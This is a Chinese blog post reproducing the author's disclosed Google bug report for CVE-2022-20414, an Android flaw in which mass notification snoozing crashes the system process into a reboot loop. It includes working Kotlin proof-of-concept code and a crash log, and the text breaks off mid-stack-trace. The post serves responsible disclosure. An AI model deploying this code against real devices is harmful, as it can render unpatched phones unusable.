<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Android系统无限重启漏洞 | Pig Cat</title><meta name="author" content="YSY"><meta name="copyright" content="YSY"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="2022年，一次偶然的机会，我发现了一个会导致Android系统无限重启致使设备完全不可用的高危漏洞，遂提交给了Google。当年11月的AOSP补丁对此进行了修复，本文是我提交漏洞报告的原文，现公开，待整理。具体可以在Android Security Bulletin—November 2022中搜索CVE-2022-20414了解更多。 最后有幸上了Google官方的致谢名单：Android">
<meta property="og:type" content="article">
<meta property="og:title" content="Android系统无限重启漏洞">
<meta property="og:url" content="https://blog.ysy950803.top/2023/02/14/Android%E7%B3%BB%E7%BB%9F%E6%97%A0%E9%99%90%E9%87%8D%E5%90%AF%E6%BC%8F%E6%B4%9E/index.html">
<meta property="og:site_name" content="Pig Cat">
<meta property="og:description" content="2022年，一次偶然的机会，我发现了一个会导致Android系统无限重启致使设备完全不可用的高危漏洞，遂提交给了Google。当年11月的AOSP补丁对此进行了修复，本文是我提交漏洞报告的原文，现公开，待整理。具体可以在Android Security Bulletin—November 2022中搜索CVE-2022-20414了解更多。 最后有幸上了Google官方的致谢名单：Android">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://blog.ysy950803.top/img/avatar-ysy.png">
<meta property="article:published_time" content="2023-02-13T16:00:00.000Z">
<meta property="article:modified_time" content="2024-08-26T03:59:47.066Z">
<meta property="article:author" content="YSY">
<meta property="article:tag" content="Android">
<meta property="article:tag" content="AOSP">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blog.ysy950803.top/img/avatar-ysy.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://blog.ysy950803.top/2023/02/14/Android%E7%B3%BB%E7%BB%9F%E6%97%A0%E9%99%90%E9%87%8D%E5%90%AF%E6%BC%8F%E6%B4%9E/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="MK2u6SdXmNALFQhaVElzr03W62cBQbIjtHK-7rvSIjw"/><meta name="baidu-site-verification" content="codeva-o8m8oS84V9"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script async="async" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(adsbygoogle = window.adsbygoogle || []).push({
  google_ad_client: 'ca-pub-8999136091629669',
  enable_page_level_ads: 'true'
});</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=UA-149830607-1"></script><script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'UA-149830607-1');
</script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":10,"languages":{"author":"作者: YSY","link":"链接: ","source":"来源: Pig Cat","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#A58A5D","bgDark":"#1f1f1f","position":"bottom-left"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Android系统无限重启漏洞',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-08-26 11:59:47'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><script>document.oncontextmenu=function(){return!1}</script><script>document.addEventListener("DOMContentLoaded",function(){const e=document.getElementById("busuanzi_value_site_uv"),t=document.getElementById("busuanzi_value_site_pv"),n=new MutationObserver(e=>{for(let t of e)if("childList"===t.type){n.disconnect(),t.target.innerHTML=parseInt(t.target.innerHTML)+1e5;break}}),i=new MutationObserver(e=>{for(let t of e)if("childList"===t.type){i.disconnect(),t.target.innerHTML=parseInt(t.target.innerHTML)+3e5;break}}),r={childList:!0};n.observe(e,r),i.observe(t,r)});</script><meta name="referrer" content="no-referrer" /><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar-ysy.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">91</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/gallery/"><i class="fa-fw fas fa-images"></i><span> Gallery</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/home-bg.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Pig Cat"><span class="site-name">Pig Cat</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/gallery/"><i class="fa-fw fas fa-images"></i><span> Gallery</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Android系统无限重启漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-02-13T16:00:00.000Z" title="发表于 2023-02-14 00:00:00">2023-02-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-08-26T03:59:47.066Z" title="更新于 2024-08-26 11:59:47">2024-08-26</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Android系统无限重启漏洞"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
<p>2022年，一次偶然的机会，我发现了一个会导致Android系统无限重启致使设备完全不可用的高危漏洞，遂提交给了Google。当年11月的AOSP补丁对此进行了修复，本文是我提交漏洞报告的原文，现公开，待整理。具体可以在<a target="_blank" rel="noopener" href="https://source.android.com/docs/security/bulletin/2022-11-01">Android Security Bulletin—November 2022</a>中搜索CVE-2022-20414了解更多。</p>
<p>最后有幸上了Google官方的致谢名单：<a target="_blank" rel="noopener" href="https://source.android.com/docs/security/overview/acknowledgements?hl=en-us#nov-22">Android 安全性致谢 2022</a>，也算是为这破碎的世界做了一点贡献吧。</p>
</blockquote>
<h3 id="Report-description"><a href="#Report-description" class="headerlink" title="Report description"></a>Report description</h3><blockquote>
<p>In a few words describe your bug. This will help you search for it later.</p>
</blockquote>
<p>The “snoozeNotification” method of NotificationListenerService causes Android system to crash and cyclic reboot.</p>
<h3 id="Bug-location"><a href="#Bug-location" class="headerlink" title="Bug location"></a>Bug location</h3><h4 id="Which-product-or-website-have-you-found-a-vulnerability-in"><a href="#Which-product-or-website-have-you-found-a-vulnerability-in" class="headerlink" title="Which product or website have you found a vulnerability in?"></a>Which product or website have you found a vulnerability in?</h4><p>Android</p>
<h3 id="The-problem"><a href="#The-problem" class="headerlink" title="The problem"></a>The problem</h3><h4 id="Please-describe-the-technical-details-of-the-vulnerability"><a href="#Please-describe-the-technical-details-of-the-vulnerability" class="headerlink" title="Please describe the technical details of the vulnerability"></a>Please describe the technical details of the vulnerability</h4><p>Starting from Android 10, there is a change about <code>AlarmManagerService</code> and we can check the commit in AOSP: <a target="_blank" rel="noopener" href="https://cs.android.com/android/_/android/platform/frameworks/base/+/0e49b64f40779d6702d10078958031fa540b6138">Adding a per-uid cap on concurrent alarms</a>. A Google engineer added a piece of code to <code>AlarmManagerService</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">setImpl</span><span class="params">(...)</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">synchronized</span> (mLock) &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">if</span> (mAlarmsPerUid.get(callingUid, <span class="number">0</span>) &gt;= mConstants.MAX_ALARMS_PER_UID) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">errorMsg</span> <span class="operator">=</span></span><br><span class="line">                <span class="string">&quot;Maximum limit of concurrent alarms &quot;</span> + mConstants.MAX_ALARMS_PER_UID</span><br><span class="line">                + <span class="string">&quot; reached for uid: &quot;</span> + UserHandle.formatUid(callingUid)</span><br><span class="line">                + <span class="string">&quot;, callingPackage: &quot;</span> + callingPackage;</span><br><span class="line">            <span class="comment">// STOPSHIP (b/128866264): Just to catch breakages. Remove before final release.</span></span><br><span class="line">            Slog.wtf(TAG, errorMsg);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>(errorMsg);</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>For any package, if the current number of alarms exceeds 500, an <code>UnsupportedOperationException</code> will be thrown and cause the process to crash, <strong>even if it is a system process.</strong></p>
<p>In general, we do not have permission to set alarm for Android system processes. But let’s take a look at another piece of code that can be implemented by any third-party application:</p>
<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">TestCrashService</span> : <span class="type">NotificationListenerService</span>() &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">val</span> random = Random(System.currentTimeMillis())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onNotificationPosted</span><span class="params">(sbn: <span class="type">StatusBarNotification</span>?)</span></span> &#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Snooze any notification here with a random duration (fixed duration also works).</span></span><br><span class="line"><span class="comment">         * The duration better be longer so snoozing can be maintained.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        sbn?.let &#123;</span><br><span class="line">            <span class="keyword">val</span> duration = TimeUnit.DAYS.toMillis(random.nextLong(<span class="number">30</span>, <span class="number">365</span>))</span><br><span class="line">            snoozeNotification(it.key, duration)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>We can import <code>android.service.notification.NotificationListenerService</code> and implement a subclass. <strong>A pending alarm is set by <code>AlarmManager</code> when <code>snoozeNotification</code> method is called.</strong></p>
<p>You can run <code>adb shell dumpsys alarm</code> to find the alarm like this:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">RTC_WAKEUP #164: Alarm&#123;6975754 type 0 origWhen 1684207980006 whenElapsed 30672085209 android&#125;</span><br><span class="line">tag=*walarm*:SnoozeHelper.EVALUATE</span><br><span class="line">type=RTC_WAKEUP origWhen=2023-05-16 11:33:00.006 window=0 exactAllowReason=allow-listed repeatInterval=0 count=0 flags=0x9</span><br><span class="line">policyWhenElapsed: requester=+354d23h27m52s23ms app_standby=-8m44s929ms device_idle=-- battery_saver=-- power_pending=--</span><br><span class="line">whenElapsed=+354d23h27m52s23ms maxWhenElapsed=+354d23h27m52s23ms</span><br><span class="line">operation=PendingIntent&#123;a03f6fd: PendingIntentRecord&#123;d9f6ff2 android broadcastIntent&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>If there are so many notifications being snoozing, an equivalent amount of pending alarms will be attached to the <strong>system process</strong> <code>android</code>. It’s very dangerous because an exception is waiting for you before reaching the maximum limit.</p>
<p><strong>Finally, the system crashes and is likely to fall into a loop of reboots. That’s where the vulnerability lies.</strong></p>
<h4 id="Please-briefly-explain-who-can-exploit-the-vulnerability-and-what-they-gain-when-doing-so"><a href="#Please-briefly-explain-who-can-exploit-the-vulnerability-and-what-they-gain-when-doing-so" class="headerlink" title="Please briefly explain who can exploit the vulnerability, and what they gain when doing so"></a>Please briefly explain who can exploit the vulnerability, and what they gain when doing so</h4><p>I have to say that this is a very serious system vulnerability. For any application that implements <code>NotificationListenerService</code>, as long as users <strong>allow notification access</strong>, it may cause Android system processes to crash, further causing the device to get stuck in a reboot loop and become unavailable.</p>
<p>We can find many apps designed to manage notifications on Play Store. They may use <code>snoozeNotification</code> method to delay or eliminate notifications. If notifications are so many and snoozing duration is not short, there will be a risk of causing Android system to crash once the number of pending alarms reaches the limit.</p>
<p><strong>In other words, someone with bad intentions has way to use this vulnerability to develop malicious applications that can blackmail others.</strong> For the average user, it is difficult to recover from this reboot loop.</p>
<h4 id="Upload-file"><a href="#Upload-file" class="headerlink" title="Upload file"></a>Upload file</h4><blockquote>
<p>You can add a file to your report to provide additional information on the vulnerability. Max file size is 50MB.</p>
</blockquote>
<p>……</p>
<h3 id="The-cause"><a href="#The-cause" class="headerlink" title="The cause"></a>The cause</h3><h4 id="Please-specify-the-steps-to-reproduce-the-issue-including-sample-code-where-appropriate-Please-be-as-detailed-as-possible"><a href="#Please-specify-the-steps-to-reproduce-the-issue-including-sample-code-where-appropriate-Please-be-as-detailed-as-possible" class="headerlink" title="Please specify the steps to reproduce the issue, including sample code where appropriate. Please be as detailed as possible."></a>Please specify the steps to reproduce the issue, including sample code where appropriate. Please be as detailed as possible.</h4><p>Any application can cause a system crash in just two steps. The sample code has been included in a complete Android Studio project attatched below.</p>
<p>Step 1: Please allow notification access for the app. Then the implementation of <code>NotificationListenerService</code> can be running.</p>
<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">fun</span> <span class="title">startNotificationAccessSetting</span><span class="params">(context: <span class="type">Context</span>)</span></span> = <span class="keyword">try</span> &#123;</span><br><span class="line">    context.startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS).apply &#123;</span><br><span class="line">        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="literal">true</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (e: ActivityNotFoundException) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        context.startActivity(Intent().apply &#123;</span><br><span class="line">            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)</span><br><span class="line">            component = ComponentName(</span><br><span class="line">                <span class="string">&quot;com.android.settings&quot;</span>,</span><br><span class="line">                <span class="string">&quot;com.android.settings.Settings\$NotificationAccessSettingsActivity&quot;</span></span><br><span class="line">            )</span><br><span class="line">            putExtra(<span class="string">&quot;:settings:show_fragment&quot;</span>, <span class="string">&quot;NotificationAccessSettings&quot;</span>)</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="literal">true</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (e1: Exception) &#123;</span><br><span class="line">        <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>And the subclass is simple like this:</p>
<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">TestCrashService</span> : <span class="type">NotificationListenerService</span>() &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">val</span> random = Random(System.currentTimeMillis())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onNotificationPosted</span><span class="params">(sbn: <span class="type">StatusBarNotification</span>?)</span></span> &#123;</span><br><span class="line">        sbn?.let &#123;</span><br><span class="line">            <span class="keyword">val</span> duration = TimeUnit.DAYS.toMillis(random.nextLong(<span class="number">30</span>, <span class="number">365</span>))</span><br><span class="line">            snoozeNotification(it.key, duration)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Step 2: Post a large number of notifications over 500 (<code>MAX_ALARMS_PER_UID</code>).</p>
<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">fun</span> <span class="title">step2</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">val</span> name = <span class="string">&quot;CrashBySnooze&quot;</span></span><br><span class="line">    <span class="keyword">val</span> descriptionText = <span class="string">&quot;For test crash.&quot;</span></span><br><span class="line">    <span class="keyword">val</span> importance = NotificationManager.IMPORTANCE_LOW</span><br><span class="line">    <span class="keyword">val</span> channel = NotificationChannel(<span class="string">&quot;crash_by_snooze&quot;</span>, name, importance).apply &#123;</span><br><span class="line">        description = descriptionText</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">val</span> ntfMgr = getSystemService(Context.NOTIFICATION_SERVICE) <span class="keyword">as</span> NotificationManager</span><br><span class="line">    ntfMgr.createNotificationChannel(channel)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">val</span> ntfBuilder = NotificationCompat.Builder(applicationContext, <span class="string">&quot;crash_by_snooze&quot;</span>)</span><br><span class="line">        .setContentTitle(<span class="string">&quot;CrashBySnooze&quot;</span>)</span><br><span class="line">        .setContentText(<span class="string">&quot;For test crash.&quot;</span>)</span><br><span class="line">        .setSmallIcon(R.mipmap.ic_launcher)</span><br><span class="line">        .setPriority(NotificationCompat.PRIORITY_LOW)</span><br><span class="line">    mainScope.launch(Dispatchers.IO) &#123;</span><br><span class="line">        <span class="keyword">val</span> ntfBaseId = Random(System.currentTimeMillis()).nextInt(<span class="number">123456</span>, <span class="number">654321</span>)</span><br><span class="line">        <span class="keyword">for</span> (i <span class="keyword">in</span> <span class="number">0.</span><span class="number">.555</span>) &#123;</span><br><span class="line">            ntfMgr.notify(ntfBaseId + i, ntfBuilder.build())</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Daily use will not have so many notifications appear at once, but day by day, this is chronic death for your Android device.</p>
<h4 id="Specify-the-build-fingerprint-from-the-device-used-to-reproduce-the-issue-The-issue-should-reproduce-on-a-recent-build-within-the-last-30-days"><a href="#Specify-the-build-fingerprint-from-the-device-used-to-reproduce-the-issue-The-issue-should-reproduce-on-a-recent-build-within-the-last-30-days" class="headerlink" title="Specify the build fingerprint from the device used to reproduce the issue. The issue should reproduce on a recent build (within the last 30 days)."></a>Specify the build fingerprint from the device used to reproduce the issue. The issue should reproduce on a recent build (within the last 30 days).</h4><blockquote>
<p>run adb shell getprop ro.build.fingerprint and adb shell cat &#x2F;proc&#x2F;version for kernel vulnerabilities</p>
</blockquote>
<p>All devices based on Android 10+ (i.e. 10~13) have this vulnerability.</p>
<h4 id="Provide-a-Proof-of-Concept-complete-Android-Studio-project-source-code-including-an-Android-bp-file-or-similar-artifacts"><a href="#Provide-a-Proof-of-Concept-complete-Android-Studio-project-source-code-including-an-Android-bp-file-or-similar-artifacts" class="headerlink" title="Provide a Proof of Concept, complete Android Studio project, source code including an Android.bp file, or similar artifacts."></a>Provide a Proof of Concept, complete Android Studio project, source code including an Android.bp file, or similar artifacts.</h4><blockquote>
<p>You can also include a malformed media file, or a video walkthrough for UX issues.</p>
</blockquote>
<p>……</p>
<h4 id="Provide-crash-artifacts-including-stack-trace-if-available"><a href="#Provide-crash-artifacts-including-stack-trace-if-available" class="headerlink" title="Provide crash artifacts including stack trace (if available)."></a>Provide crash artifacts including stack trace (if available).</h4><p>The crash can cause system zyote to die:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">2022-05-27 16:35:11.453 1451-1451/system_process W/AlarmManager: Maximum limit of concurrent alarms 500 reached for uid: 1000, callingPackage: android</span><br><span class="line">2022-05-27 16:35:11.453 1451-1451/system_process E/Zygote: System zygote died with fatal exception</span><br><span class="line">    java.lang.IllegalStateException: Maximum limit of concurrent alarms 500 reached for uid: 1000, callingPackage: android</span><br><span class="line">        at com.android.server.alarm.AlarmManagerService.setImpl(AlarmManagerService.java:2087)</span><br><span class="line">        at com.android.server.alarm.AlarmManagerService$5.set(AlarmManagerService.java:2630)</span><br><span class="line">        at android.app.AlarmManager.setImpl(AlarmManager.java:957)</span><br><span class="line">        at android.app.AlarmManager.setImpl(AlarmManager.java:917)</span><br><span class="line">        at android.app.AlarmManager.setExactAndAllowWhileIdle(AlarmManager.java:1185)</span><br><span class="line">        at com.android.server.notification.SnoozeHelper.lambda$scheduleRepostAtTime$2$SnoozeHelper(SnoozeHelper.java:508)</span><br><span class="line">        at com.android.server.notification.SnoozeHelper$$ExternalSyntheticLambda4.run(Unknown Source:10)</span><br><span class="line">        at 